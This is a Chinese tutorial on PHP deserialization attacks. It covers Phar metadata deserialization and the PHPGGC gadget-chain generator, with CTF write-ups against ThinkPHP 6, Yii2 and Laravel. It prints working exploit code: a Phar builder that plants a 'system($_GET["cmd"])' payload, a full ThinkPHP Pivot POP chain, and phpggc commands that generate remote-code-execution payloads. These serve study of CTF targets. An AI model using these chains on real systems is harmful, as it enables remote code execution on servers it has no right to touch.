---
title: PHP反序列化&Phar文件类&CLI框架类&PHPGGC生成器&TP&Yii&Laravel
published: 2026-07-16T12:00:00
description: PHP反序列化进阶包括Phar反序列化（通过文件系统函数触发）、框架反序列化链工具（如PHPGGC生成复杂POP链）及框架利用（ThinkPHP、Yii2、Laravel等）。这些技术适用于绕过unserialize()限制或简化漏洞利用，在CTF和实战中广泛应用。
tags:
  - 反序列化
  - PHP
  - Web攻防
  - Phar
category: 网络安全
draft: false
---

# 知识点

1. PHP-反序列化 -Phar反序列化  
2. PHP-反序列化-框架反序列化链生成项目  
3. PHP-反序列化-框架反序列化利用

# Phar反序列化

解释：从PHP 5.3开始，引入了类似于JAR的一种打包文件机制。它可以把多个文件存放至同一个文件中，无需解压，PHP就可以进行访问并执行内部语句。

|        函数名        |      函数名      |     函数名      |        函数名        |
| :---------------: | :-----------: | :----------: | :---------------: |
|     fileatime     |   filectime   | file_exists  | file_get_contents |
| file_put_contents |     file      |  filegroup   |       fopen       |
|     fileinode     |   filemtime   |  fileowner   |     fileperms     |
|      is_dir       | is_executable |   is_file    |      is_link      |
|    is_readable    |  is_writable  | is_writeable |  parse_ini_file   |
|       copy        |    unlink     |     stat     |     readfile      |

原理：PHP文件系统函数在通过伪协议解析phar文件时，都会将meta-data进行反序列化操作，受影响的函数如上图；所以当这些函数接收到伪协议处理到phar文件的时候，Meta-data里的序列化字符串就会被反序列化，实现不使用unserialize()函数实现反序列化操作。

利用条件

1.phar文件(任意后缀都可以)能上传至服务器。

2.存在受影响函数，存在可以利用的魔术方法。

生成Phar注意：

php.ini中将Phar.readonly设置为off

## Demo

phar.php：

```php
<?php  
class AnyClass  
{  
    // 定义类的属性  
    var $output = '';  
  
    // 构造函数，在序列化时输出提示信息  
    function __construct()  
    {  
        echo "正在生成...";  
    }  
}  
  
// 创建一个新的phar对象，指定生成的phar文件名为 phar.phar 自定义
$phar = new Phar('phar.phar');  
  
// 停止phar的缓冲  
$phar->stopBuffering();  
  
// 设置phar文件的存根，这是phar文件的标志，必须以 __HALT_COMPILER();
$phar->setStub('<?php __HALT_COMPILER();?>');  
  
// 向phar文件中添加一个字符串作为文件内容，这里创建一个名为vfree.txt的文件，内容为vfree  自定义
$phar->addFromString('vfree.txt','vfree');  
  
// 实例化AnyClass类  
$obj = new AnyClass();  
  
// 向类的output属性写入命令执行代码，危险代码  
$obj->output = 'system($_GET["cmd"])';
```

pharpoc.php：

```php
<?php  
// 显示当前文件的源代码  
show_source(__FILE__);  
  
// 获取GET请求中名为filename的函数  
$filename = $_GET['filename'];  
  
// 定义一个类 AnyClass
class AnyClass  
{  
    // 定义类的属性output，初始值为一段php代码  
    var $output = 'echo "ok!";';  
  
    // 析构函数，当对象被销毁时执行output属性中的代码  
    function __destruct()  
    {  
        eval($this->output);  
    }  
}  
  
//unserialize($filename);// 如果是按照之前的学习内容，触发RCE那么必须要有反序列化函数，以及危险方法  
  
// 检查phar文件中是否存在vfree.txt  
file_exists($filename);
```

运行phar.php，会生成文件，文件中包含vfree.txt，之后使用poc

```
ip:port/pharpoc.php?filename=phar://phar.phar/vfree.txt&cmd=ipconfig
							phar伪协议  文件名  文件名
```

## `[HNCTF 2022 WEEK3]`ez_phar

靶场代码：

```php
<?php  
show_source(__FILE__);  
class Flag  
{  
    public $code;  
  
    public function __destruct()  
    {  
        // TODO: Implement __destruct() method.  
        eval($this->code);  
    }  
}  
  
$filename = $_GET['filename'];  
file_exists($filename);
```

pop链：

```php
<?php  
class Flag{  
    public $code;  
    public function __destruct(){  
        // TODO: Implement __destruct() method.  
        eval($this->code);  
    }  
}  
  
$a=new Flag();  
$a->code="system('cat /ffflllaaaggg');";  
  
$phar = new Phar("xxxx.phar"); //后缀名必须为phar  
$phar->startBuffering();  
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub  
$phar->setMetadata($a); //将自定义的meta-data存入manifest  
$phar->addFromString("xxxx.txt", "xxxx"); //添加要压缩的文件  
$phar->stopBuffering();
```

经过目录扫描，对方还存在upload.php，如果直接上传会提示后缀名不合法，需要修改为任意后缀，比如png

```
ip:port/upload/xxxx.png // 检测是否存在
ip:port/?filename=phar://upload/xxxx.png // 拿到flag
```

upload.php上传文件引用访问触发

白盒代码审计案例：

https://mp.weixin.qq.com/s/2wzaXIpJgYSNnkJgRNUSEg

https://mp.weixin.qq.com/s/Z24A3LYn6P3276v7GqPw4w

# 反序列化链项目

框架类的反序列化及对应`POP`链编写是非常复杂的。比`CTF`那种原生态反序列化源码难很多很多。

利用场景：  
当知道目标使用了某个框架及对应版本并且这个框架版本曝过反序列漏洞，那么就可以尝试利用该项目去生成反序列链。

## NotSoSecure

https://github.com/NotSoSecure/SerializedPayloadGenerator

为了利用反序列化漏洞，需要设置不同的工具，如 YSoSerial(Java)、YSoSerial.NET、PHPGGC 和它的先决条件。DeserializationHelper 是包含对 YSoSerial(Java)、YSoSerial.Net、PHPGGC 和其他工具的支持的Web界面。使用Web界面，您可以为各种框架生成反序列化payload.

```
Java – YSoSerial
NET – YSoSerial.NET
PHP – PHPGGC
Python - 原生
```

## PHPGGC

https://github.com/ambionics/phpggc

PHPGGC是一个包含unserialize()有效载荷的库以及一个从命令行或以编程方式生成它们的工具。当在您没有代码的网站上遇到反序列化时，或者只是在尝试构建漏洞时，此工具允许您生成有效负载，而无需执行查找小工具并将它们组合的繁琐步骤。 它可以看作是frohoff的ysoserial的等价物，但是对于PHP。目前该工具支持的小工具链包括：CodeIgniter4、Doctrine、Drupal7、Guzzle、Laravel、Magento、Monolog、Phalcon、Podio、ThinkPHP、Slim、SwiftMailer、Symfony、Wordpress、Yii和ZendFramework等。

# 反序列化框架利用

## `[安洵杯 2019]iamthinking` Thinkphp V6.0.X 反序列化

提示`/public/`，打开发现只是一张图片

扫描目录发现：`www.zip (Status: 200) [Size: 900796]`

下载源码，进入`public/index.php`，发现路由在app目录

打开`app/controller/index.php`，源代码只存在一个反序列化函数的使用，一处需要绕过，还有一个传参的地方，其他没有危害点

使用phpggc搜索tp漏洞：

```
./phpggc -l thinkphp
```

使用方式：

```
./phpggc ThinkPHP/RCE3 <function> <parameter>
以下两种都可以利用
./phpggc ThinkPHP/RCE3 system 'cat /flag' --base64
./phpggc ThinkPHP/RCE4 system 'cat /flag' --url
```

或者利用网上给出的poc：

```php
<?php  
namespace think\model\concern{  
    trait ModelEvent{  
        protected $withEvent = false;  
    }  
    trait Attribute{  
        protected $strict = true;  
        private $data = ["poc" => "cat /flag"];  
        private $withAttr = ["poc" => "system"];  
    }  
    trait Conversion{  
    }  
}  
namespace think{  
    abstract class Model {  
        use model\concern\Attribute;  
        use model\concern\Conversion;  
        use model\concern\ModelEvent;  
        private $lazySave;  
        private $exists;  
        private $force;  
        protected $table;  
        function __construct(){  
            $this->lazySave = true;  
            $this->exists = true;  
            $this->force = true;  
            $this->table = true;  
        }  
    }  
}  
namespace think\model {  
  
    use think\Model;  
  
    class Pivot extends Model  
    {  
        public function __construct($a = '')  
        {  
            parent::__construct();  
            $this->table = $a;  
        }  
    }  
    echo urlencode(serialize(new Pivot(new Pivot())));  
}
```

```
http://xxxxxxxxx.cn:81///public/?payload=
```

## CTFSHOW 反序列化 267 Yii2反序列化

弱口令登录后源码提示泄漏

GET：index.php?r=site%2Fabout&view-source

```
///backdoor/shell
unserialize(base64_decode($_GET['code']))
```

加载数据包，发现有yii.js，打开数据包，发现版本为2.0

phpggc搜索yii漏洞：

```
./phpggc -l yii
```

使用方式：

```
./phpggc Yii2/RCE1 exec 'cp /fla* tt.txt' --base64
```

GET：/index.php?r=backdoor/shell&code=

exec只执行，没有结果

GET：/tt.txt

## CTFSHOW 反序列化 271 Laravel反序列化

```
./phpggc -l laravel
```

```
./phpggc Laravel/RCE2 system "id" --url
```